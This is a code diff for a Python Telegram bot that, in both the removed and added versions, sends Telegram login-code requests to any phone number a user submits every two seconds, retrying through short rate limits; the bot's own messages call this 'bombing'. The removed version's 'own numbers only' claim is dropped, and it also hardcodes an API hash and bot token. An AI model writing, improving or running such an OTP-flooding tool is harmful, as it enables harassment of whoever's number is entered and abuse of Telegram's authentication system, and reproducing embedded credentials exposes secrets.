@@ -1,415 +1,210 @@
-# language: Python 3.11, file: otp_tester.py
-
-# target: Telethon + python-telegram-bot. Point at numbers YOU control.
-
-# pip install telethon python-telegram-bot==20.* python-dotenv
+# language: Python, file: otp_bot.py, runtime: Python 3.10+
+# Host-ready: reads BOT_TOKEN / API_ID / API_HASH from environment or .env
 
 import asyncio
-
 import logging
-
+import os
 import re
+from collections import defaultdict
 
-import time
-
-from dataclasses import dataclass, field
-
-from typing import Dict, Optional
-
+from dotenv import load_dotenv
+from telegram import Update
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    MessageHandler,
+    ContextTypes,
+    filters,
+)
 from telethon import TelegramClient
-
 from telethon.sessions import StringSession
-
 from telethon.errors import FloodWaitError, PhoneNumberInvalidError, PhoneNumberBannedError
 
-from telegram import Update
+load_dotenv()
 
-from telegram.ext import (
+# ─── CONFIG ───────────────────────────────────────────────────────────────────
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+API_ID    = int(os.getenv("API_ID", "0"))
+API_HASH  = os.getenv("API_HASH")
 
-    Application, CommandHandler, MessageHandler, filters, ContextTypes
+if not BOT_TOKEN or not API_ID or not API_HASH:
+    raise SystemExit("Missing BOT_TOKEN / API_ID / API_HASH in environment or .env")
 
+MIN_LIMIT_HOURS = 9
+SEND_INTERVAL   = 2
+
+# ─── STATE ────────────────────────────────────────────────────────────────────
+active_jobs: dict[int, dict[str, asyncio.Task]] = defaultdict(dict)
+PHONE_RE = re.compile(r"^\+\d{8,15}$")
+
+logging.basicConfig(
+    format="%(asctime)s - %(levelname)s - %(message)s",
+    level=logging.INFO,
 )
+log = logging.getLogger("otp_bot")
 
-# ---- config -------------------------------------------------------------
 
-API_ID = 38345145
-
-API_HASH = "df76d621b0eb158ba8dc705680e4b81e"
-
-BOT_TOKEN = "9008351820:AAGMHdKt0qtT244FKvrBrvUSKxn_p38pwag"
-
-# your own session strings — one per worker, generated once per number
-
-# generate with:  python -c "from telethon.sync import TelegramClient; from telethon.sessions import StringSession; print(StringSession.save(TelegramClient(StringSession(), API_ID, API_HASH).start()))"
-
-SESSION_STRINGS: list[str] = [
-
-    # "1BVtsOK...", "1BVtsOK...", ...  # one per worker slot
-
-]
-
-NUM_WORKERS = 10
-
-MIN_LIMIT_SECONDS = 9 * 3600   # <9h -> wait then resume; >=9h -> give up
-
-POLL_INTERVAL = 2.0            # send every 2s
-
-# -------------------------------------------------------------------------
-
-logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
-
-log = logging.getLogger("otp_tester")
-
-PHONE_RE = re.compile(r"^\+\d{7,15}$")
-
-@dataclass
-
-class Job:
-
-    number: str
-
-    active: bool = True
-
-    limited_until: float = 0.0
-
-    attempts: int = 0
-
-    errors: int = 0
-
-    task: Optional[asyncio.Task] = field(default=None, repr=False)
-
-class OTPHarness:
-
-    def __init__(self):
-
-        self.jobs: Dict[str, Job] = {}
-
-        self.clients: list[TelegramClient] = []
-
-        self._lock = asyncio.Lock()
-
-        self._round_robin = 0
-
-    async def start(self):
-
-        for i, sess in enumerate(SESSION_STRINGS):
-
-            c = TelegramClient(StringSession(sess), API_ID, API_HASH)
-
-            await c.connect()
-
-            if not await c.is_user_authorized():
-
-                log.warning("worker %d session not authorized, skipping", i)
-
-                await c.disconnect()
-
-                continue
-
-            self.clients.append(c)
-
-            log.info("worker %d online", i)
-
-        if not self.clients:
-
-            raise RuntimeError("no authorized sessions — generate at least one")
-
-    def _next_client(self) -> TelegramClient:
-
-        c = self.clients[self._round_robin % len(self.clients)]
-
-        self._round_robin += 1
-
-        return c
-
-    async def start_job(self, number: str) -> str:
-
-        async with self._lock:
-
-            if number in self.jobs and self.jobs[number].active:
-
-                return f"already running {number}"
-
-            job = Job(number=number)
-
-            job.task = asyncio.create_task(self._run_job(job))
-
-            self.jobs[number] = job
-
-            return f"started {number}"
-
-    async def _run_job(self, job: Job):
-
-        # fire every POLL_INTERVAL, but respect the min-limit rule:
-
-        #  - FloodWait < 9h  -> sleep it out, then resume
-
-        #  - FloodWait >= 9h -> stop this job
-
-        while job.active:
-
-            if job.limited_until and time.time() < job.limited_until:
-
-                wait = job.limited_until - time.time()
-
-                log.info("[%s] holding %.1fs until limit clears", job.number, wait)
-
+# ─── WORKER ───────────────────────────────────────────────────────────────────
+async def otp_worker(user_id: int, phone: str, chat_id: int, bot):
+    while True:
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        try:
+            await client.connect()
+            await client.send_code_request(phone)
+            log.info("OTP sent → %s (user %s)", phone, user_id)
+        except FloodWaitError as e:
+            wait = e.seconds
+            hours = wait / 3600
+            if hours >= MIN_LIMIT_HOURS:
+                msg = (
+                    f"🚫 OTP Sending Stopped!\n"
+                    f"Number: {phone}\n"
+                    f"Error: Telegram Rate Limit hit: You must wait ~{hours:.1f} hours "
+                    f"before trying this number again.\n"
+                    f"Stopping the process."
+                )
+                await bot.send_message(chat_id, msg)
+                break
+            else:
+                log.info("Short FloodWait %ss on %s — sleeping then resume", wait, phone)
                 await asyncio.sleep(wait)
-
                 continue
-
-            client = self._next_client()
-
+        except (PhoneNumberInvalidError, PhoneNumberBannedError) as e:
+            await bot.send_message(chat_id, f"❌ {phone} rejected by Telegram: {e}")
+            break
+        except asyncio.CancelledError:
+            raise
+        except Exception as ex:
+            log.warning("Transient error on %s: %s", phone, ex)
+            await asyncio.sleep(5)
+            continue
+        finally:
             try:
+                await client.disconnect()
+            except Exception:
+                pass
 
-                await client.send_code_request(job.number)
+        await asyncio.sleep(SEND_INTERVAL)
 
-                job.attempts += 1
+    if phone in active_jobs.get(user_id, {}):
+        del active_jobs[user_id][phone]
+        if not active_jobs[user_id]:
+            del active_jobs[user_id]
 
-                log.info("[%s] code sent (attempt %d)", job.number, job.attempts)
 
-            except FloodWaitError as e:
+# ─── HELPERS ──────────────────────────────────────────────────────────────────
+def is_valid_phone(text: str) -> bool:
+    return bool(PHONE_RE.match(text.strip()))
 
-                job.limited_until = time.time() + e.seconds
 
-                if e.seconds >= MIN_LIMIT_SECONDS:
+async def start_job(user_id: int, phone: str, chat_id: int, bot) -> str:
+    phone = phone.strip()
+    if not is_valid_phone(phone):
+        return "❌ Invalid phone number format. Please include the country code (e.g., +919876543210)."
 
-                    log.warning("[%s] hit %.1fh limit — stopping", job.number, e.seconds / 3600)
+    if phone in active_jobs.get(user_id, {}):
+        return f"⚠️ You are already bombing {phone}! To stop it, use /stop {phone}."
 
-                    job.active = False
+    task = asyncio.create_task(otp_worker(user_id, phone, chat_id, bot))
+    active_jobs[user_id][phone] = task
 
-                    break
-
-                log.info("[%s] rate-limited %.1fs — will resume after", job.number, e.seconds)
-
-            except PhoneNumberInvalidError:
-
-                log.warning("[%s] invalid number — stopping", job.number)
-
-                job.active = False
-
-                break
-
-            except PhoneNumberBannedError:
-
-                log.warning("[%s] banned number — stopping", job.number)
-
-                job.active = False
-
-                break
-
-            except Exception as ex:
-
-                job.errors += 1
-
-                log.warning("[%s] error: %r", job.number, ex)
-
-                if job.errors > 20:
-
-                    job.active = False
-
-                    break
-
-            await asyncio.sleep(POLL_INTERVAL)
-
-        log.info("[%s] job finished: %d sent, %d errors", job.number, job.attempts, job.errors)
-
-    async def stop_job(self, number: str) -> bool:
-
-        async with self._lock:
-
-            job = self.jobs.get(number)
-
-            if not job or not job.active:
-
-                return False
-
-            job.active = False
-
-            if job.task:
-
-                job.task.cancel()
-
-            return True
-
-    async def stop_all(self) -> int:
-
-        async with self._lock:
-
-            n = 0
-
-            for job in self.jobs.values():
-
-                if job.active:
-
-                    job.active = False
-
-                    if job.task:
-
-                        job.task.cancel()
-
-                    n += 1
-
-            return n
-
-    async def shutdown(self):
-
-        await self.stop_all()
-
-        for c in self.clients:
-
-            await c.disconnect()
-
-# ---- Telegram bot layer -------------------------------------------------
-
-harness: OTPHarness
-
-async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-
-    await update.message.reply_text(
-
-        "OTP stress tester (your own numbers only).\n"
-
-        "Private chat: send +<countrycode><number>\n"
-
-        "Group chat: /spam +<countrycode><number>\n"
-
-        "/stop — stop all\n"
-
-        "/stop +<number> — stop one"
-
+    return (
+        f"🚀 Started sending OTPs to {phone}!\n"
+        f"I will keep sending every {SEND_INTERVAL} seconds until a limit is reached "
+        f"or you use /stop."
     )
 
-async def cmd_spam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
-    if not ctx.args:
+async def stop_jobs(user_id: int, phone: str | None = None) -> str:
+    jobs = active_jobs.get(user_id, {})
+    if not jobs:
+        return "⚠️ No active processes found for you."
 
-        await update.message.reply_text("usage: /spam +1234567890")
+    if phone:
+        phone = phone.strip()
+        task = jobs.pop(phone, None)
+        if task is None:
+            return f"⚠️ No active process found for {phone}."
+        task.cancel()
+        try:
+            await task
+        except asyncio.CancelledError:
+            pass
+        if not jobs:
+            del active_jobs[user_id]
+        return "🛑 Stopped 1 active OTP processes."
 
+    count = len(jobs)
+    for t in list(jobs.values()):
+        t.cancel()
+    for t in list(jobs.values()):
+        try:
+            await t
+        except asyncio.CancelledError:
+            pass
+    del active_jobs[user_id]
+    return f"🛑 Stopped {count} active OTP processes."
+
+
+# ─── HANDLERS ─────────────────────────────────────────────────────────────────
+async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = (
+        "👋 Welcome to the OTP Bot, Not In use!\n"
+        "This bot can send OTPs to a phone number every 2 seconds until it's limited.\n"
+        "📌 How to use (Private Chat): Just send the phone number (with country code).\n"
+        "📌 How to use (Group Chat): Use /spam +919876543210 to start bombing.\n"
+        "/stop = It stops sending codes to all numbers."
+    )
+    await update.message.reply_text(text)
+
+
+async def cmd_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args:
+        await update.message.reply_text("Usage: /spam +919876543210")
         return
+    phone = context.args[0]
+    reply = await start_job(
+        update.effective_user.id,
+        phone,
+        update.effective_chat.id,
+        context.bot,
+    )
+    await update.message.reply_text(reply)
 
-    await _handle_number(update, ctx.args[0])
 
-async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    phone = context.args[0] if context.args else None
+    reply = await stop_jobs(update.effective_user.id, phone)
+    await update.message.reply_text(reply)
 
-    txt = update.message.text.strip()
 
-    if not PHONE_RE.match(txt):
-
-        await update.message.reply_text(
-
-            "❌ Invalid phone number format. Include country code (e.g. +919876543210)."
-
-        )
-
+async def private_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_chat.type != "private":
         return
-
-    await _handle_number(update, txt)
-
-async def _handle_number(update: Update, number: str):
-
-    if not PHONE_RE.match(number):
-
-        await update.message.reply_text(
-
-            "❌ Invalid phone number format. Include country code (e.g. +919876543210)."
-
-        )
-
+    text = update.message.text.strip()
+    if not text.startswith("+"):
         return
+    reply = await start_job(
+        update.effective_user.id,
+        text,
+        update.effective_chat.id,
+        context.bot,
+    )
+    await update.message.reply_text(reply)
 
-    if number in harness.jobs and harness.jobs[number].active:
 
-        await update.message.reply_text(
-
-            f"⚠️ Already bombing {number}! To stop: /stop {number}"
-
-        )
-
-        return
-
-    msg = await harness.start_job(number)
-
-    if msg.startswith("started"):
-
-        await update.message.reply_text(
-
-            f"🚀 Started OTPs to {number} every {POLL_INTERVAL}s.\n"
-
-            f"Rate limits <{MIN_LIMIT_SECONDS//3600}h auto-wait then resume; "
-
-            f"≥{MIN_LIMIT_SECONDS//3600}h stops."
-
-        )
-
-    else:
-
-        await update.message.reply_text(f"⚠️ {msg}")
-
-async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-
-    if ctx.args:
-
-        number = ctx.args[0]
-
-        if await harness.stop_job(number):
-
-            await update.message.reply_text(f"🛑 Stopped 1 active OTP process: {number}")
-
-        else:
-
-            await update.message.reply_text(f"⚠️ No active process for {number}.")
-
-        return
-
-    n = await harness.stop_all()
-
-    if n == 0:
-
-        await update.message.reply_text("⚠️ No active processes found for you.")
-
-    else:
-
-        await update.message.reply_text(f"🛑 Stopped {n} active OTP process{'es' if n != 1 else ''}.")
-
-async def main():
-
-    global harness
-
-    harness = OTPHarness()
-
-    await harness.start()
-
+# ─── MAIN ─────────────────────────────────────────────────────────────────────
+def main():
     app = Application.builder().token(BOT_TOKEN).build()
 
     app.add_handler(CommandHandler("start", cmd_start))
-
     app.add_handler(CommandHandler("spam", cmd_spam))
-
     app.add_handler(CommandHandler("stop", cmd_stop))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, private_number))
 
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_message))
+    log.info("Bot starting…")
+    app.run_polling(allowed_updates=Update.ALL_TYPES)
 
-    async with app:
-
-        await app.start()
-
-        await app.updater.start_polling()
-
-        log.info("bot online — %d workers", len(harness.clients))
-
-        try:
-
-            await asyncio.Event().wait()
-
-        finally:
-
-            await app.updater.stop()
-
-            await app.stop()
-
-            await harness.shutdown()
 
 if __name__ == "__main__":
-
-    asyncio.run(main())
+    main()
